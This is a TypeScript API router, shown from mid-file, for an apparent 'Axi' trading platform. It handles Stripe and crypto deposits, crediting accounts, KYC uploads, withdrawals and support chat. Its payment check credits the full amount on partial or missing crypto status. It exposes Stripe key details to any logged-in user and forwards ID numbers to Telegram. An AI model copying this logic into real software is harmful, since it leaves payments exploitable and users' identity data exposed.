      // Log pending transaction (Balance is NOT credited until payment is approved)
      await db.insert(transactions).values({
        userId: ctx.user!.id,
        accountId: account.id,
        type: "deposit",
        amount: amountVal.toString(),
        currency: input.currency,
        status: "pending",
        paymentMethod: "Credit Card / Stripe Session",
        reference: `Stripe Ref: ${sessionId}`,
        createdAt: new Date(),
      });
      
      // Send Telegram notification
      try {
        const userEmail = ctx.user?.email || "User";
        await notifyNewDeposit(userEmail, `${amountVal} ${input.currency}`, `Credit Card (Stripe Session - ${sessionId})`);
      } catch (err) {
        console.error("Failed to notify admin on Telegram:", err);
      }
      
      return { success: true, sessionId, checkoutUrl };
    }),

  // ── New: Create NOWPayments Crypto Invoice ──────────
  createNowpaymentsInvoice: authedQuery
    .input(z.object({
      amount: z.number().or(z.string()),
      currency: z.string().default("USD"),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = parseFloat(input.amount.toString());
      const apiKey = process.env.NOWPAYMENTS_API_KEY;
      
      if (!apiKey) {
        const simInvoiceId = `np_sim_${Date.now()}`;
        const checkoutUrl = `/simulated-nowpayments?amount=${amountVal}&currency=${input.currency}&account=${account.accountNumber}&invoiceId=${simInvoiceId}`;

        await db.insert(transactions).values({
          userId: ctx.user!.id,
          accountId: account.id,
          type: "deposit",
          amount: amountVal.toString(),
          currency: input.currency,
          status: "pending",
          paymentMethod: "USDT (TRC20 NOWPayments Sandbox)",
          reference: `NOWPayments Ref: ${simInvoiceId}`,
          createdAt: new Date(),
        });

        try {
          const userEmail = ctx.user?.email || "User";
          await notifyNewDeposit(userEmail, `${amountVal} ${input.currency}`, `USDT (NOWPayments Sandbox)`);
        } catch (err) {
          console.error("Failed to notify admin on Telegram:", err);
        }

        return { success: true, invoiceId: simInvoiceId, checkoutUrl };
      }
      
      let invoiceId = "";
      let checkoutUrl = "";
      
      try {
        const reqUrl = new URL(ctx.req.url);
        const baseUrl = `${reqUrl.protocol}//${reqUrl.host}`;
        const response = await fetch("https://api.nowpayments.io/v1/invoice", {
          method: "POST",
          headers: {
            "x-api-key": apiKey,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            price_amount: amountVal,
            price_currency: input.currency.toLowerCase(),
            pay_currency: "usdttrc20",
            order_id: `AXI-TX-${Date.now()}`,
            order_description: `Trading Account Funding ${account.accountNumber}`,
            success_url: `${baseUrl}/dashboard?deposit_status=success`,
            cancel_url: `${baseUrl}/dashboard?deposit_status=cancel`,
          }),
        });
        
        if (response.ok) {
          const data = await response.json();
          invoiceId = data.id || "";
          checkoutUrl = data.invoice_url || "";
        } else {
          const errText = await response.text();
          throw new Error(`NOWPayments API Error: ${errText}`);
        }
      } catch (err: any) {
        console.error("NOWPayments invoice creation error:", err);
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `Crypto gateway error: ${err.message || "Failed to initialize crypto invoice."}`,
        });
      }
      
      // Log pending transaction
      await db.insert(transactions).values({
        userId: ctx.user!.id,
        accountId: account.id,
        type: "deposit",
        amount: amountVal.toString(),
        currency: input.currency,
        status: "pending",
        paymentMethod: "USDT (TRC20)",
        reference: `NOWPayments Ref: ${invoiceId}`,
        createdAt: new Date(),
      });
      
      // Send Telegram notification
      try {
        const userEmail = ctx.user?.email || "User";
        await notifyNewDeposit(userEmail, `${amountVal} ${input.currency}`, `USDT (NOWPayments - ${invoiceId})`);
      } catch (err) {
        console.error("Failed to notify admin on Telegram:", err);
      }
      
      return { success: true, invoiceId, checkoutUrl };
    }),

  // ── New: Complete Payment & Credit Account ─────────
  completePayment: authedQuery
    .input(z.object({
      sessionId: z.string().optional(),
      invoiceId: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      if (!input.sessionId && !input.invoiceId) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Either sessionId or invoiceId must be provided",
        });
      }

      const targetRef = input.sessionId 
        ? `Stripe Ref: ${input.sessionId}`
        : `NOWPayments Ref: ${input.invoiceId}`;

      // Find the pending deposit transaction
      const [tx] = await db
        .select()
        .from(transactions)
        .where(
          and(
            eq(transactions.userId, ctx.user!.id),
            eq(transactions.type, "deposit"),
            eq(transactions.status, "pending"),
            eq(transactions.reference, targetRef)
          )
        );

      if (!tx) {
        // Check if it's already completed
        const [completedTx] = await db
          .select()
          .from(transactions)
          .where(
            and(
              eq(transactions.userId, ctx.user!.id),
              eq(transactions.type, "deposit"),
              eq(transactions.status, "completed"),
              eq(transactions.reference, targetRef)
            )
          );
        if (completedTx) {
          return { success: true, alreadyCompleted: true, amount: parseFloat(completedTx.amount.toString()), currency: completedTx.currency };
        }
        throw new TRPCError({
          code: "NOT_FOUND",
          message: "Pending deposit transaction not found.",
        });
      }

      // Validate payment status with gateway before crediting balance
      if (input.sessionId) {
        const apiKey = process.env.STRIPE_SECRET_KEY;
        if (!apiKey) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "STRIPE_SECRET_KEY is not configured on the server. Stripe payment verification failed.",
          });
        }
        try {
          const StripeModule = await import("stripe");
          const stripeObj = new StripeModule.default(apiKey, { apiVersion: "2023-10-16" as never });
          const session = await stripeObj.checkout.sessions.retrieve(input.sessionId);
          
          if (session.payment_status !== "paid") {
            throw new TRPCError({
              code: "BAD_REQUEST",
              message: `Stripe payment session status is '${session.payment_status}'. Account balance will only be credited after payment approval.`,
            });
          }
        } catch (err: any) {
          if (err instanceof TRPCError) throw err;
          console.error("Error retrieving Stripe session:", err);
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: `Stripe verification failed: ${err.message || "Payment not approved"}`,
          });
        }
      }

      if (input.invoiceId) {
        const apiKey = process.env.NOWPAYMENTS_API_KEY;
        if (!apiKey) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: "NOWPayments API Key is not configured on the server. Blockchain invoice verification failed.",
          });
        }
        try {
          const resp = await fetch(`https://api.nowpayments.io/v1/payment/${input.invoiceId}`, {
            headers: { "x-api-key": apiKey }
          });
          if (resp.ok) {
            const data = await resp.json();
            const validStatuses = ["finished", "confirmed", "partially_paid"];
            if (data.payment_status && !validStatuses.includes(data.payment_status)) {
              throw new TRPCError({
                code: "BAD_REQUEST",
                message: `Crypto invoice status is '${data.payment_status}'. Balance will only be credited after blockchain confirmation.`,
              });
            }
          } else {
            throw new Error("NOWPayments invoice lookup failed.");
          }
        } catch (err: any) {
          if (err instanceof TRPCError) throw err;
          console.error("Error retrieving NOWPayments invoice:", err);
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: `Crypto verification failed: ${err.message || "Payment not confirmed"}`,
          });
        }
      }

      // Complete the transaction
      const amount = parseFloat(tx.amount.toString());
      const account = await getOrCreateAccount(ctx.user!.id);
      
      const currentBalance = parseFloat(account.balance.toString());
      const currentEquity = parseFloat(account.equity.toString());
      
      const newBalance = currentBalance + amount;
      const newEquity = currentEquity + amount;

      await db
        .update(tradingAccounts)
        .set({
          balance: newBalance.toFixed(8),
          equity: newEquity.toFixed(8),
        })
        .where(eq(tradingAccounts.id, account.id));

      await db
        .update(transactions)
        .set({
          status: "completed",
          completedAt: new Date(),
        })
        .where(eq(transactions.id, tx.id));

      return { success: true, amount, currency: tx.currency };
    }),

  getKycStatus: authedQuery.query(async ({ ctx }) => {
    const db = getDb();
    const userId = ctx.user!.id;
    const records = await db
      .select()
      .from(kycVerifications)
      .where(eq(kycVerifications.userId, userId))
      .orderBy(desc(kycVerifications.submittedAt));

    if (!records || records.length === 0) {
      return { status: "unverified", record: null, timeRemainingSec: 0 };
    }

    const latest = records[0];
    const currentStatus = latest.status;

    return {
      status: currentStatus,
      record: {
        id: latest.id,
        fullName: latest.fullName,
        idType: latest.idType,
        idNumber: latest.idNumber,
        country: latest.country,
        submittedAt: latest.submittedAt,
        rejectionReason: latest.rejectionReason,
      },
      timeRemainingSec: 0,
    };
  }),

  submitManualKyc: authedQuery
    .input(
      z.object({
        fullName: z.string().min(2, "Full name is required"),
        dob: z.string().min(2, "Date of birth is required"),
        address: z.string().min(2, "Address is required"),
        city: z.string().min(2, "City is required"),
        country: z.string().min(2, "Country is required"),
        postalCode: z.string().min(2, "Postal code is required"),
        idType: z.enum(["drivers_license", "passport", "national_id"]),
        idNumber: z.string().min(2, "ID/Document number is required"),
        frontImage: z.string().min(10, "Front ID photo/document is required"),
        backImage: z.string().optional(),
        selfieImage: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const userId = ctx.user!.id;
      const userEmail = ctx.user!.email || "trader@axi.com";

      await db.insert(kycVerifications).values({
        userId,
        userEmail,
        fullName: input.fullName,
        dob: input.dob,
        address: input.address,
        city: input.city,
        country: input.country,
        postalCode: input.postalCode,
        idType: input.idType,
        idNumber: input.idNumber,
        frontImage: input.frontImage,
        backImage: input.backImage || null,
        selfieImage: input.selfieImage || null,
        status: "pending",
        submittedAt: new Date(),
      });

      // Dispatch Telegram Alert to Admin / Support Channel
      notifyKycSubmission({
        userEmail,
        fullName: input.fullName,
        idType: input.idType,
        idNumber: input.idNumber,
        country: input.country,
      });

      return {
        success: true,
        status: "pending",
        estimatedMinutes: 20,
        message: "Your manual verification documents have been submitted to Axi Compliance. Approval will take 15 to 30 minutes.",
      };
    }),

  // ── New: Create Withdrawal Request ─────────────────
  createWithdrawal: authedQuery
    .input(
      z.object({
        amount: z.number().or(z.string()),
        currency: z.string().default("USD"),
        paymentMethod: z.string(),
        destinationDetails: z.string(),
        notes: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const account = await getOrCreateAccount(ctx.user!.id);
      const amountVal = parseFloat(input.amount.toString());

      if (isNaN(amountVal) || amountVal < 5) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: "Minimum withdrawal amount is $5.00 USD (or equivalent).",
        });
      }

      const currentBalance = parseFloat(account.balance.toString());
      if (amountVal > currentBalance) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `Insufficient balance. Available: $${currentBalance.toFixed(2)} USD. Requested: $${amountVal.toFixed(2)} USD.`,
        });
      }

      // Log withdrawal transaction in database
      const [newTx] = await db
        .insert(transactions)
        .values({
          userId: ctx.user!.id,
          accountId: account.id,
          type: "withdrawal",
          amount: amountVal.toString(),
          currency: input.currency.toUpperCase(),
          status: "pending",
          paymentMethod: input.paymentMethod,
          reference: `WD-${Date.now().toString(36).toUpperCase()} (${input.destinationDetails})`,
          createdAt: new Date(),
        })
        .returning();

      // Notify Admin via Telegram
      try {
        const userEmail = ctx.user?.email || "Trader";
        await notifyNewWithdrawal(
          userEmail,
          `$${amountVal.toFixed(2)} ${input.currency.toUpperCase()}`,
          `${input.paymentMethod} -> ${input.destinationDetails}`
        );
      } catch (err) {
        console.error("Failed to dispatch Telegram withdrawal notification:", err);
      }

      return {
        success: true,
        txId: newTx?.id || 0,
        amount: amountVal,
        currency: input.currency.toUpperCase(),
        paymentMethod: input.paymentMethod,
        accountNumber: account.accountNumber,
        reference: newTx?.reference || "WD-PENDING",
      };
    }),

  // ── Support Chat Endpoints ─────────────────────────
  sendSupportMessage: authedQuery
    .input(z.object({
      message: z.string().min(1),
      sender: z.enum(["user", "bot"]).default("user"),
      transferredToAdmin: z.boolean().default(false),
    }))
    .mutation(async ({ ctx, input }) => {
      const db = getDb();
      const userId = ctx.user!.id;
      const userEmail = ctx.user!.email || "trader@axi.com";
      const userName = ctx.user!.name || userEmail.split("@")[0];

      const [msg] = await db.insert(supportMessages).values({
        userId,
        userName,
        userEmail,
        sender: input.sender,
        message: input.message,
        transferredToAdmin: input.transferredToAdmin,
        createdAt: new Date(),
      }).returning();

      return { success: true, message: msg };
    }),

  getSupportMessages: authedQuery
    .query(async ({ ctx }) => {
      const db = getDb();
      const userId = ctx.user!.id;
      const msgs = await db.select()
        .from(supportMessages)
        .where(eq(supportMessages.userId, userId))
        .orderBy(supportMessages.createdAt);
      return msgs;
    }),

  // ── Stripe Live Connection Status Check ────────────
  testStripeConnection: authedQuery
    .query(async () => {
      const apiKey = process.env.STRIPE_SECRET_KEY;
      if (!apiKey) {
        return {
          connected: false,
          mode: "none",
          message: "STRIPE_SECRET_KEY environment variable is not configured on server.",
          keyPrefix: null,
        };
      }

      try {
        const StripeModule = await import("stripe");
        const stripeObj = new StripeModule.default(apiKey, { apiVersion: "2023-10-16" as never });
        
        // Retrieve balance to test live secret key validity
        const balance = await stripeObj.balance.retrieve();
        const isLive = apiKey.startsWith("sk_live_");

        return {
          connected: true,
          mode: isLive ? "LIVE" : "TEST",
          message: `Stripe connection active! ${isLive ? "Live Production" : "Test"} secret key verified.`,
          keyPrefix: apiKey.substring(0, 10) + "...",
          availableCurrencies: balance.available?.map(b => b.currency.toUpperCase()) || ["USD"],
        };
      } catch (err: any) {
        return {
          connected: false,
          mode: apiKey.startsWith("sk_live_") ? "LIVE" : "TEST",
          message: `Stripe API error: ${err.message || "Invalid secret key or permission error."}`,
          keyPrefix: apiKey.substring(0, 10) + "...",
        };
      }
    }),
});
